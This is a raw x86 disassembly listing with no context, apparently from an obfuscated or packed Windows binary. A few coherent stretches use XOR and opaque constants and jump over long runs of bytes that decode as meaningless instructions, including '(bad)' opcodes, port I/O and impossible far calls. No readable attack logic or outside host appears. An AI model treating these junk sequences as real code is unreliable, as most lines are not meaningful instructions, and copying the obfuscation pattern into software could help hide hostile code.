  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     cl,BYTE PTR [ebp+0x79c95997]
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b004:	cmp    al,0xb8
  40b006:	push   ecx
  40b007:	fptan  
  40b009:	loop   0x40b063
  40b00b:	test   BYTE PTR [esi],cl
  40b00d:	xchg   BYTE PTR [edx],ch
  40b00f:	loop   0x40b024
  40b011:	pop    eax
  40b012:	enter  0x34fb,0xe2
  40b016:	js     0x40afb9
  40b018:	ficom  DWORD PTR [eax+0x490a24b2]
  40b01e:	mov    DWORD PTR [edi-0x35f16791],ebx
  40b024:	jae    0x40b005
  40b026:	icebp  
  40b027:	sar    DWORD PTR [eax+0x33070181],1
  40b02d:	dec    ebx
  40b02e:	pop    edi
  40b02f:	outs   dx,DWORD PTR ds:[esi]
  40b030:	into   
  40b031:	popf   
  40b032:	js     0x40b068
  40b034:	es mov dl,0x28
  40b037:	cwde   
  40b038:	stos   DWORD PTR es:[edi],eax
  40b039:	push   ecx
  40b03a:	inc    edi
  40b03b:	in     eax,dx
  40b03c:	and    BYTE PTR ds:0x1fb69bf7,0x45
  40b043:	mov    eax,ds:0xa64a09c1
  40b048:	pushf  
  40b049:	les    ecx,FWORD PTR [eax]
  40b04b:	retf   0x4e49
  40b04e:	mov    cl,0x50
  40b050:	cdq    
  40b051:	xchg   esp,eax
  40b052:	jae    0x40b059
  40b054:	mov    ecx,ebx
  40b056:	mov    al,0x94
  40b058:	inc    ecx
  40b059:	inc    esp
  40b05a:	jae    0x40affa
  40b05c:	out    dx,eax
  40b05d:	test   eax,0xdff888cc
  40b062:	cmp    ah,dl
  40b064:	ror    BYTE PTR [ebp-0xe2170b0],cl
  40b06a:	sbb    ch,BYTE PTR [edi+0x34afe7a2]
  40b070:	inc    ecx
  40b071:	dec    ecx
  40b072:	mov    eax,ds:0x66a97755
  40b077:	daa    
  40b078:	jp     0x40b042
  40b07a:	push   ds
  40b07b:	test   eax,0x1ead6656
  40b080:	in     al,0x5c
  40b082:	jmp    FWORD PTR [edx+0x7696dddc]
  40b088:	aaa    
  40b089:	jmp    0x5139:0x90b92066
  40b090:	out    0x1c,eax
  40b092:	sub    ecx,DWORD PTR [ebp+0x1aa2607f]
  40b098:	add    eax,edi
  40b09a:	loopne 0x40b05d
  40b09c:	inc    edx
  40b09d:	fsub   QWORD PTR [edx]
  40b09f:	mov    ds:0xe01adf51,al
  40b0a4:	jle    0x40b0ef
  40b0a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0a8:	jp     0x40b099
  40b0aa:	or     BYTE PTR [eax+0x7c63bac7],0xae
  40b0b1:	repz cmp dl,BYTE PTR [esi]
  40b0b4:	mov    ah,0x7e
  40b0b6:	mov    BYTE PTR [edi-0x109ab6d3],dh
  40b0bc:	mov    edi,0x7fa5ef3e
  40b0c1:	rol    DWORD PTR [edx],0x2a
  40b0c4:	add    DWORD PTR ds:0x8be3054a,eax
  40b0ca:	outs   dx,DWORD PTR ds:[esi]
  40b0cb:	mov    dh,0xeb
  40b0cd:	iret   
  40b0ce:	push   edx
  40b0cf:	xadd   DWORD PTR [esi],ebp
  40b0d2:	mov    ah,0x68
  40b0d4:	(bad)  
  40b0d5:	aam    0xa5
  40b0d7:	or     DWORD PTR [ebp-0x67],ebp
  40b0da:	jl     0x40b122
  40b0dc:	xchg   ebp,eax
  40b0dd:	mov    dh,0xbd
  40b0df:	mov    edx,0xfca13bd
  40b0e4:	popf   
  40b0e5:	cwde   
  40b0e6:	das    
  40b0e7:	inc    edi
  40b0e8:	mov    esp,DWORD PTR [eax]
  40b0ea:	nop
  40b0eb:	pop    es
  40b0ec:	clc    
  40b0ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0ee:	ins    BYTE PTR es:[edi],dx
  40b0ef:	jge    0x40b10e
  40b0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0f2:	call   0x84f2:0x4738bb44
  40b0f9:	sti    
  40b0fa:	retf   0x471c
  40b0fd:	lahf   
  40b0fe:	mov    dl,0x38
  40b100:	gs mov eax,0xef97b6af
  40b106:	xchg   edi,eax
  40b107:	fnsave [ebp-0x76927f78]
  40b10d:	std    
  40b10e:	rcr    DWORD PTR [ecx],1
  40b110:	sub    esi,DWORD PTR [edx+0x1d]
  40b113:	mov    eax,0xd066fd6
  40b118:	jge    0x40b0ed
  40b11a:	sahf   
  40b11b:	clc    
  40b11c:	fsub   QWORD PTR [eax]
  40b11e:	ja     0x40b0c2
  40b120:	js     0x40b12d
  40b122:	mov    ebp,DWORD PTR [edi-0x56b50736]
  40b128:	cmp    ecx,esp
  40b12a:	shl    DWORD PTR ds:0xe09afa53,cl
  40b130:	xor    DWORD PTR [edi+0x5a],0xcff60dfa
  40b137:	fcomi  st,st(4)
  40b139:	ret    
  40b13a:	sub    bh,BYTE PTR [edx+0x56eb4798]
  40b140:	inc    ebp
  40b141:	int3   
  40b142:	sub    cl,BYTE PTR [edx+0x5b278780]
  40b148:	leave  
  40b149:	(bad)  
  40b14a:	inc    BYTE PTR [ebx+eax*1-0x60]
  40b14e:	sbb    DWORD PTR [edx],esi
  40b150:	stos   DWORD PTR es:[edi],eax
  40b151:	jg     0x40b0ed
  40b153:	jb     0x40b0e4
  40b155:	popa   
  40b156:	bound  ebx,QWORD PTR ds:0xd56efa73
  40b15c:	sbb    eax,0xb1d46636
  40b161:	push   0x73
  40b163:	stos   BYTE PTR es:[edi],al
  40b164:	mov    bh,0x1a
  40b166:	adc    eax,0x27c84a0
  40b16b:	scas   al,BYTE PTR es:[edi]
  40b16c:	push   ss
  40b16d:	ss dec eax
  40b16f:	cmp    al,0x28
  40b171:	or     DWORD PTR [ebp+esi*4-0xa07c03d],0xc3d65fbe
  40b17c:	mov    esi,0xc88401b2
  40b181:	repnz and BYTE PTR [ebp+ebx*8-0x6ef34f1f],0x4f
  40b18a:	xchg   BYTE PTR [edx-0x6929823b],dh
  40b190:	mov    ds:0x613705ef,al
  40b195:	mov    ds:0x9b67c6e5,al
  40b19a:	test   DWORD PTR [ebx+0x58],eax
  40b19d:	push   edi
  40b19e:	and    eax,0x6138014c
  40b1a3:	cmp    BYTE PTR [esi],dh
  40b1a5:	enter  0x9f3,0xf9
  40b1a9:	ss leave 
  40b1ab:	(bad)  
  40b1ac:	xchg   esp,eax
  40b1ad:	mov    WORD PTR [edi],ss
  40b1af:	sbb    ebp,DWORD PTR [ebx+0x13]
  40b1b2:	ret    0x15a5
  40b1b5:	or     al,0x1b
  40b1b7:	xlat   BYTE PTR ds:[ebx]
  40b1b8:	or     eax,0xa16aaffc
  40b1bd:	nop
  40b1be:	sbb    cl,BYTE PTR [edx-0x77]
  40b1c1:	push   edx
  40b1c2:	pop    edx
  40b1c3:	das    
  40b1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1c5:	add    BYTE PTR [esi],0x37
  40b1c8:	mov    esp,ecx
  40b1ca:	xchg   ecx,eax
  40b1cb:	in     eax,dx
  40b1cc:	dec    eax
  40b1cd:	mov    ebx,0xd948fc80
  40b1d2:	test   al,0xff
  40b1d4:	inc    ecx
  40b1d5:	call   FWORD PTR [edi+0x6e1d0b21]
  40b1db:	scas   eax,DWORD PTR es:[edi]
  40b1dc:	imul   ebp,DWORD PTR [eax],0xf977aba7
  40b1e2:	pop    edi
  40b1e3:	test   DWORD PTR ds:0x9c709dd0,ebp
  40b1e9:	and    BYTE PTR [edi+edx*8+0x5c],dh
  40b1ed:	sbb    DWORD PTR [ecx],esp
  40b1ef:	mov    al,0xef
  40b1f1:	mov    dl,0x5b
  40b1f3:	test   edi,0xd3503577
  40b1f9:	inc    edx
  40b1fa:	dec    ebx
  40b1fb:	sahf   
  40b1fc:	or     BYTE PTR ds:0x8ccc447c,dh
  40b202:	or     BYTE PTR [edi+0x35],dl
  40b205:	ret    0xa279
  40b208:	test   al,0xf7
  40b20a:	xor    ebx,ebp
  40b20c:	push   eax
  40b20d:	mov    esi,0x62180c34
  40b212:	mov    WORD PTR [edi+edi*2+0x3c7e3a52],gs
  40b219:	xchg   ebx,eax
  40b21a:	dec    esi
  40b21b:	lods   eax,DWORD PTR ds:[esi]
  40b21c:	and    edx,DWORD PTR [esi-0x54fa4ce4]
  40b222:	adc    ecx,esi
  40b224:	xor    ebp,DWORD PTR ds:[ebp+edi*1-0x18612d9c]
  40b22c:	(bad)  
  40b22d:	cmc    
  40b22e:	lea    esi,[ebx+esi*8]
  40b231:	and    bh,0x75
  40b234:	mov    ah,0xbf
  40b236:	add    al,0x24
  40b238:	int    0xe
  40b23a:	fst    DWORD PTR [eax]
  40b23c:	mov    ch,0xef
  40b23e:	fwait
  40b23f:	sub    al,0xde
  40b241:	xlat   BYTE PTR ds:[ebx]
  40b242:	into   
  40b243:	sbb    DWORD PTR [edx],edx
  40b245:	mov    ds:0x3abb10c2,al
  40b24a:	(bad)  
  40b24b:	sti    
  40b24c:	jle    0x40b245
  40b24e:	stos   BYTE PTR es:[edi],al
  40b24f:	cli    
  40b250:	into   
  40b251:	sub    dh,BYTE PTR [ecx+0x9]
  40b254:	sub    eax,0xd94a7df6
  40b259:	rol    DWORD PTR [eax+esi*8],cl
  40b25c:	dec    edx
  40b25d:	stos   DWORD PTR es:[edi],eax
  40b25e:	retf   
  40b25f:	sub    ecx,edx
  40b261:	adc    DWORD PTR [ebp-0x7a90c9d4],edi
  40b267:	in     eax,0xe8
  40b269:	(bad)  
  40b26b:	fimul  DWORD PTR [esi+0x63]
  40b26e:	dec    esi
  40b26f:	fsubrp st(4),st
  40b271:	sbb    eax,0x152f450d
  40b276:	leave  
  40b277:	lods   al,BYTE PTR ds:[esi]
  40b278:	push   esi
  40b279:	imul   ebx,esp,0x20
  40b27c:	rcr    BYTE PTR [eax],1
  40b27e:	jmp    0x40b2c6
  40b280:	adc    eax,0x785b4e4d
  40b285:	not    BYTE PTR [ecx+esi*8-0x69]
  40b289:	push   ebx
  40b28a:	fnstenv [edi-0x45]
  40b28d:	dec    ecx
  40b28e:	push   edi
  40b28f:	pop    esi
  40b290:	pushf  
  40b291:	pop    ebx
  40b292:	sub    eax,0x9d0a24d1
  40b297:	fwait
  40b298:	pushf  
  40b299:	fldcw  WORD PTR [ebx+0xb]
  40b29c:	xor    dh,BYTE PTR [edi+0x484dc0d4]
  40b2a2:	retf   0x40b4
  40b2a5:	test   al,0x7f
  40b2a7:	stos   DWORD PTR es:[edi],eax
  40b2a8:	or     eax,0x9a36d12c
  40b2ad:	pusha  
  40b2ae:	cmp    esp,DWORD PTR [edx-0x3a]
  40b2b1:	fcom   QWORD PTR [edi]
  40b2b3:	mov    bl,0xaa
  40b2b5:	sahf   
  40b2b6:	or     ecx,0x14
  40b2b9:	out    dx,eax
  40b2ba:	mov    DWORD PTR [ebp-0x59],esp
  40b2bd:	and    esp,DWORD PTR [ecx]
  40b2bf:	test   edx,edx
  40b2c1:	leave  
  40b2c2:	(bad)  
  40b2c3:	ins    BYTE PTR es:[edi],dx
  40b2c4:	inc    ecx
  40b2c5:	cmp    al,0xca
  40b2c7:	(bad)  
  40b2c8:	mov    BYTE PTR [ebx+0x5e1d9a48],dh
  40b2ce:	dec    esp
  40b2cf:	(bad)  
  40b2d1:	call   0x43ca:0x48b8ea68
  40b2d8:	xlat   BYTE PTR ds:[ebx]
  40b2d9:	fld    TBYTE PTR [edx-0x77b32d6f]
  40b2df:	xchg   DWORD PTR [ebp+0x8],edi
  40b2e2:	fiadd  DWORD PTR [ebp+0x7e]
  40b2e5:	push   ebx
  40b2e6:	lods   al,BYTE PTR ds:[esi]
  40b2e7:	pop    ebx
  40b2e8:	in     eax,dx
  40b2e9:	pushf  
  40b2ea:	push   ss
  40b2eb:	inc    ecx
  40b2ec:	arpl   WORD PTR [esi-0x5f],si
  40b2ef:	arpl   WORD PTR [ebp+ebp*2-0x75],si
  40b2f3:	fwait
  40b2f4:	or     cl,BYTE PTR [edx+0x1ace3ee9]
  40b2fa:	fs pop esp
  40b2fc:	mov    dh,0xb3
  40b2fe:	xor    BYTE PTR [eax],cl
  40b300:	cmc    
  40b301:	scas   eax,DWORD PTR es:[edi]
  40b302:	ins    DWORD PTR es:[edi],dx
  40b303:	test   DWORD PTR [edi],edi
  40b305:	icebp  
  40b306:	push   ebx
  40b307:	hlt    
  40b308:	(bad)  [edx]
  40b30a:	pushf  
  40b30b:	icebp  
  40b30c:	jb     0x40b31d
  40b30e:	fsub   DWORD PTR [edi+0x3681446a]
  40b314:	cli    
  40b315:	sub    eax,DWORD PTR [esi+edx*4]
  40b318:	aad    0x3c
  40b31a:	mov    eax,ds:0xb3c91ae4
  40b31f:	push   ss
  40b320:	sbb    ebx,ebx
  40b322:	push   cs
  40b323:	dec    edx
  40b324:	in     eax,0x59
  40b326:	loopne 0x40b32e
  40b328:	stos   DWORD PTR es:[edi],eax
  40b329:	sub    al,0x72
  40b32b:	cmp    BYTE PTR [edx-0x51],al
  40b32e:	int3   
  40b32f:	xlat   BYTE PTR ds:[ebx]
  40b330:	test   eax,0x458b2098
  40b335:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	cmp    al,0x12
  40b376:	nop
  40b377:	shr    DWORD PTR [ecx],1
  40b379:	idiv   DWORD PTR [esi+0x7e]
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b3ee
  40b381:	and    al,0x27
  40b383:	loope  0x40b33c
  40b385:	shr    cl,cl
  40b387:	or     eax,0xe288d5b4
  40b38c:	push   ss
  40b38d:	pop    esi
  40b38e:	pop    edx
  40b38f:	xor    BYTE PTR [ebx+0x54b1f528],dl
  40b395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b396:	jae    0x40b3db
  40b398:	fsub   st,st(5)
  40b39a:	jle    0x40b3f7
  40b39c:	test   eax,0x979222b7
  40b3a1:	fimul  WORD PTR [eax+0x49]
  40b3a4:	call   0x3ad:0xddf3d128
  40b3ab:	and    edi,DWORD PTR [edi-0x5f6850e]
  40b3b1:	aad    0x11
  40b3b3:	sbb    DWORD PTR [edi-0x35],edi
  40b3b6:	mov    bh,0x29
  40b3b8:	sub    al,0x8
  40b3ba:	fmul   st,st(1)
  40b3bc:	dec    ecx
  40b3bd:	adc    eax,esp
  40b3bf:	pop    eax
  40b3c0:	mov    al,ds:0x7d204424
  40b3c5:	pop    edx
  40b3c6:	test   eax,0x186e20ab
  40b3cb:	outs   dx,DWORD PTR ds:[esi]
  40b3cc:	pop    esp
  40b3cd:	fisub  WORD PTR [ebp-0x48]
  40b3d0:	sbb    al,0x79
  40b3d2:	mov    esp,0x9a351065
  40b3d7:	int3   
  40b3d8:	pop    es
  40b3d9:	mov    ebp,0xad93f859
  40b3de:	xor    al,0x92
  40b3e0:	in     eax,0xe7
  40b3e2:	jns    0x40b3aa
  40b3e4:	jge    0x40b427
  40b3e6:	mov    WORD PTR [ebx],?
  40b3e8:	int    0xb1
  40b3ea:	cmp    eax,0x74a22bc
  40b3ef:	adc    al,0xe8
  40b3f1:	fnstsw WORD PTR [edx]
  40b3f3:	add    dl,bl
  40b3f5:	aas    
  40b3f6:	cld    
  40b3f7:	sub    DWORD PTR [edi],edi
  40b3f9:	mov    ds:0x9843f70a,eax
  40b3fe:	loopne 0x40b42a
  40b400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b401:	sbb    eax,0x1d40990a
  40b406:	test   eax,0xa5fd65d2
  40b40b:	ss dec ecx
  40b40d:	arpl   dx,bp
  40b40f:	cmp    ebx,DWORD PTR [ebx-0x67]
  40b412:	push   0xffffffb8
  40b414:	fst    QWORD PTR [edi-0x32]
  40b417:	adc    bh,dh
  40b419:	mov    WORD PTR [edx+ecx*8],gs
  40b41c:	inc    edi
  40b41d:	mov    al,0x14
  40b41f:	(bad)
  40b423:	xor    DWORD PTR [edi-0x4c],ecx
  40b426:	adc    eax,0x9f3a61
  40b42b:	int3   
  40b42c:	pop    edx
  40b42d:	pop    esp
  40b42e:	xchg   ebp,eax
  40b42f:	ret    0x65e
  40b432:	retf   
  40b433:	sbb    ecx,edi
  40b435:	sub    eax,ebx
  40b437:	stos   DWORD PTR es:[edi],eax
  40b438:	and    al,0xb
  40b43a:	pop    DWORD PTR [ecx+0x36]
  40b43d:	xchg   ebp,eax
  40b43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b43f:	test   eax,0x74dd5759
  40b444:	and    al,0x5
  40b446:	lock outs dx,DWORD PTR ds:[esi]
  40b448:	mov    cl,0x8f
  40b44a:	sub    esi,ebp
  40b44c:	rcr    BYTE PTR [eax+0x66d31372],0xcd
  40b453:	hlt    
  40b454:	shl    ch,0xc0
  40b457:	mov    al,ds:0x816f04f3
  40b45c:	lock loopne 0x40b460
  40b45f:	xor    eax,0x94c351d6
  40b464:	gs jl  0x40b4be
  40b467:	nop
  40b468:	push   cs
  40b469:	mov    ds:0x7f429d3a,al
  40b46e:	repnz stc 
  40b470:	ins    BYTE PTR es:[edi],dx
  40b471:	lds    cx,DWORD PTR ds:[ecx]
  40b475:	rcl    BYTE PTR ds:0x546927f,cl
  40b47b:	add    bh,0x2a
  40b47e:	mov    esi,0x85ae048d
  40b483:	loopne 0x40b4bb
  40b485:	mov    dh,0xbf
  40b487:	mov    ch,al
  40b489:	cld    
  40b48a:	cs cdq 
  40b48c:	cmp    edx,esi
  40b48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b48f:	cmp    DWORD PTR ds:0xaaf0d8,esp
  40b495:	xchg   ecx,eax
  40b496:	pop    ds
  40b497:	bound  edi,QWORD PTR [edi]
  40b499:	pusha  
  40b49a:	std    
  40b49b:	imul   eax,ebx,0xffffffb1
  40b49e:	push   eax
  40b49f:	jl     0x40b44e
  40b4a1:	dec    esp
  40b4a2:	imul   eax,DWORD PTR [eax],0xffffff9b
  40b4a5:	bound  esp,QWORD PTR [edx]
  40b4a7:	jle    0x40b522
  40b4a9:	mov    WORD PTR ss:[ecx+0x23],?
  40b4ad:	dec    ebp
  40b4ae:	add    eax,0x5450ed4d
  40b4b3:	jl     0x40b4ef
  40b4b5:	sub    al,0xb
  40b4b7:	sti    
  40b4b8:	and    esp,DWORD PTR [edx]
  40b4ba:	or     DWORD PTR [edi],ebx
  40b4bc:	or     BYTE PTR [esp+eiz*4+0x656defd0],ah
  40b4c3:	mov    esp,DWORD PTR [edx-0x6b]
  40b4c6:	adc    al,0xad
  40b4c8:	or     al,0xec
  40b4ca:	mov    dh,0x6f
  40b4cc:	pop    edx
  40b4cd:	int3   
  40b4ce:	cmp    BYTE PTR [eax+esi*2+0x6c],bl
  40b4d2:	xor    BYTE PTR [esi],dl
  40b4d4:	push   esi
  40b4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4d6:	jo     0x40b47b
  40b4d8:	dec    ebx
  40b4d9:	push   0xffffffae
  40b4db:	jmp    0x8de3eac
  40b4e0:	adc    BYTE PTR ds:0x3b80af05,ch
  40b4e6:	mov    ebp,es
  40b4e8:	cdq    
  40b4e9:	pop    ds
  40b4ea:	jae    0x40b4ae
  40b4ec:	fs xchg ebp,eax
  40b4ee:	fwait
  40b4ef:	mov    ch,BYTE PTR [esp+ecx*8-0x6f59684e]
  40b4f6:	aad    0xdc
  40b4f8:	pusha  
  40b4f9:	jne    0x40b562
  40b4fb:	inc    esi
  40b4fc:	outs   dx,DWORD PTR ds:[esi]
  40b4fd:	lock mul BYTE PTR [edx+ebx*2+0x3e512450]
  40b505:	hlt    
  40b506:	mov    eax,0x7406c6df
  40b50b:	push   edx
  40b50c:	repz leave 
  40b50e:	sub    esi,DWORD PTR [eax]
  40b510:	shr    DWORD PTR [edx],cl
  40b512:	jmp    FWORD PTR [edx+ebp*2-0x48]
  40b516:	jecxz  0x40b513
  40b518:	aam    0x2b
  40b51a:	retf   0x7643
  40b51d:	scas   eax,DWORD PTR es:[edi]
  40b51e:	cmp    esp,DWORD PTR [edx]
  40b520:	add    eax,0x4754e692
  40b525:	in     eax,0x17
  40b527:	loopne 0x40b59f
  40b529:	add    BYTE PTR [edi+eiz*8+0x4a1a8236],0x3
  40b531:	aam    0xa2
  40b533:	loope  0x40b51f
  40b535:	inc    ecx
  40b536:	push   esi
  40b537:	inc    edi
  40b538:	outs   dx,BYTE PTR ds:[esi]
  40b539:	mov    DWORD PTR [ecx+0x4dc7ed60],edx
  40b53f:	adc    bh,BYTE PTR [edi+0x6b3a22a5]
  40b545:	sbb    ecx,DWORD PTR [ebx-0x19a7336a]
  40b54b:	arpl   WORD PTR [ecx+0x4162ef05],sp
  40b551:	xchg   DWORD PTR [eax+0x4da3ebc6],esi
  40b557:	jle    0x40b596
  40b559:	push   eax
  40b55a:	xor    edx,ebx
  40b55c:	mov    edi,0xb80e67d2
  40b561:	mov    cl,0x34
  40b563:	scas   al,BYTE PTR es:[edi]
  40b564:	ffree  st(3)
  40b566:	jae    0x40b559
  40b568:	add    BYTE PTR [eax+0x60c3a5ed],ah
  40b56e:	std    
  40b56f:	lahf   
  40b570:	rol    DWORD PTR [ebp+0x30],cl
  40b573:	ins    BYTE PTR es:[edi],dx
  40b574:	jmp    0x40b5e9
  40b576:	fdiv   DWORD PTR [edi+0x59adbd9d]
  40b57c:	or     eax,0x6ed833ce
  40b581:	inc    ebx
  40b582:	sbb    al,0x40
  40b584:	mov    esp,0xefe09fc9
  40b589:	push   cs
  40b58a:	in     eax,0x1b
  40b58c:	out    0x68,eax
  40b58e:	(bad)  
  40b58f:	cs jno 0x40b60d
  40b592:	push   cs
  40b593:	je     0x40b528
  40b595:	push   ss
  40b596:	xchg   esi,eax
  40b597:	cwde   
  40b598:	lds    esp,FWORD PTR [esi+eiz*1]
  40b59b:	push   ecx
  40b59c:	out    dx,al
  40b59d:	jae    0x40b5ed
  40b59f:	xor    al,0x6
  40b5a1:	ds (bad) 
  40b5a3:	inc    ebx
  40b5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5a5:	and    al,0x17
  40b5a7:	jl     0x40b5aa
  40b5a9:	hlt    
  40b5aa:	jbe    0x40b59e
  40b5ac:	push   ss
  40b5ad:	inc    ebx
  40b5ae:	mov    al,ds:0xf9b22853
  40b5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b4:	clc    
  40b5b5:	dec    edx
  40b5b6:	mov    eax,0x18be06c7
  40b5bb:	test   DWORD PTR [esi+0x2b5d1fc],eax
  40b5c1:	mov    WORD PTR [esi-0x18bc5389],gs
  40b5c7:	daa    
  40b5c8:	and    esi,edx
  40b5ca:	mov    DWORD PTR [ecx],ebp
  40b5cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5cd:	xor    DWORD PTR [edi+0x19e842d],ebx
  40b5d3:	test   BYTE PTR [ebx-0x4c],cl
  40b5d6:	fucomi st,st(5)
  40b5d8:	xchg   ebx,eax
  40b5d9:	test   al,0x38
  40b5db:	mov    dl,0x27
  40b5dd:	xchg   esp,eax
  40b5de:	mov    ds:0x9d41d875,eax
  40b5e3:	je     0x40b5bd
  40b5e5:	sub    edi,DWORD PTR ds:0x409097e6
  40b5eb:	push   esp
  40b5ec:	jp     0x40b5e0
  40b5ee:	jle    0x40b57c
  40b5f0:	js     0x40b5eb
  40b5f2:	lods   al,BYTE PTR ds:[esi]
  40b5f3:	jmp    0x46e1d664
  40b5f8:	mov    al,ds:0x6a204d13
  40b5fd:	pusha  
  40b5fe:	jmp    0x40b602
  40b600:	mov    eax,ds:0xfce1432c
  40b605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b606:	out    0x13,al
  40b608:	neg    DWORD PTR [ebp-0x6d]
  40b60b:	mov    dh,0x4a
  40b60d:	push   edx
  40b60e:	addr16 push edi
  40b610:	sub    DWORD PTR [ebx+0x5c69fb9d],esp
  40b616:	arpl   WORD PTR [eax],bx
  40b618:	jl     0x40b5c3
  40b61a:	loope  0x40b69a
  40b61c:	ja     0x40b678
  40b61e:	mov    ds:0x5dd7f1b0,al
  40b623:	dec    edx
  40b624:	or     dl,BYTE PTR [ebp-0x51cdcffe]
  40b62a:	lock mov edx,0xac346577
  40b630:	sar    BYTE PTR [esi-0x696f21f3],cl
  40b636:	outs   dx,BYTE PTR ds:[esi]
  40b637:	pop    ecx
  40b638:	pushf  
  40b639:	push   edi
  40b63a:	and    BYTE PTR [edi-0x79],ah
  40b63d:	jbe    0x40b625
  40b63f:	lea    ebp,[ebp+0x34]
  40b642:	inc    esi
  40b643:	retf   
  40b644:	mov    eax,ds:0x58f81ab4
  40b649:	or     eax,0xa505f4fe
  40b64e:	test   eax,0xf1f898a2
  40b653:	or     edx,ebx
  40b655:	sbb    esp,DWORD PTR [edi-0x2b]
  40b658:	shl    DWORD PTR [ebx+0x4a4ce029],0x9
  40b65f:	jmp    0xfa24f545
  40b664:	sbb    al,0xae
  40b666:	push   edi
  40b667:	out    dx,al
  40b668:	xchg   edi,eax
  40b669:	dec    ebx
  40b66a:	cmp    al,0xdc
  40b66c:	rcr    DWORD PTR [eax-0x11],1
  40b66f:	loope  0x40b68a
  40b671:	dec    ebp
  40b672:	js     0x40b6ca
  40b674:	outs   dx,BYTE PTR ds:[esi]
  40b675:	inc    ebp
  40b676:	jns    0x40b628
  40b678:	enter  0x1026,0x8b
  40b67c:	pusha  
  40b67d:	test   BYTE PTR [edx],dh
  40b67f:	sbb    bh,BYTE PTR [edx-0x6]
  40b682:	and    eax,0xb2a0b009
  40b687:	imul   esi,DWORD PTR [edi+0x70513ef7],0xffffffa9
  40b68e:	fild   DWORD PTR [eax+0x5f]
  40b691:	fld    QWORD PTR [ebx-0x6f]
  40b694:	scas   eax,DWORD PTR es:[edi]
  40b695:	fidiv  DWORD PTR [edi]
  40b697:	cdq    
  40b698:	cmp    DWORD PTR ss:[eax+0x74],eax
  40b69c:	sub    BYTE PTR [edx-0x57],bh
  40b69f:	mov    ds:0xfa05fe7f,al
  40b6a4:	ins    BYTE PTR es:[edi],dx
  40b6a5:	add    bh,ah
  40b6a7:	(bad)  
  40b6a8:	fcmovnu st,st(2)
  40b6aa:	push   edx
  40b6ab:	loop   0x40b6b6
  40b6ad:	cmp    DWORD PTR [ebp+esi*2-0x75],ebx
  40b6b1:	inc    ebp
  40b6b2:	lock mov ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0xa9
  40b6da:	add    BYTE PTR [ebx-0x64],cl
  40b6dd:	fptan  
  40b6df:	jle    0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b6f5
  40b6e6:	inc    ebp
  40b6e7:	repnz adc ebx,0xffffffe5
  40b6eb:	lods   eax,DWORD PTR ds:[esi]
  40b6ec:	push   ds
  40b6ed:	jne    0x40b6d7
  40b6ef:	xor    al,0xb1
  40b6f1:	sbb    eax,0xbe47da64
  40b6f6:	sbb    bh,BYTE PTR [edx+0x6bab4a89]
  40b6fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6fd:	pop    ds
  40b6fe:	or     esp,DWORD PTR [esi-0x22]
  40b701:	lahf   
  40b702:	xchg   ebx,eax
  40b703:	add    BYTE PTR [edi+0x64e605b7],ah
  40b709:	into   
  40b70a:	pop    ds
  40b70b:	mov    ebp,0x7d2e3dd4
  40b710:	ja     0x40b727
  40b712:	popf   
  40b713:	mov    cl,0x9a
  40b715:	pop    ebx
  40b716:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40b718:	jae    0x40b792
  40b71a:	stc    
  40b71b:	sbb    eax,0x86892783
  40b720:	stos   DWORD PTR es:[edi],eax
  40b721:	enter  0x4e16,0x6f
  40b725:	mov    bl,0x25
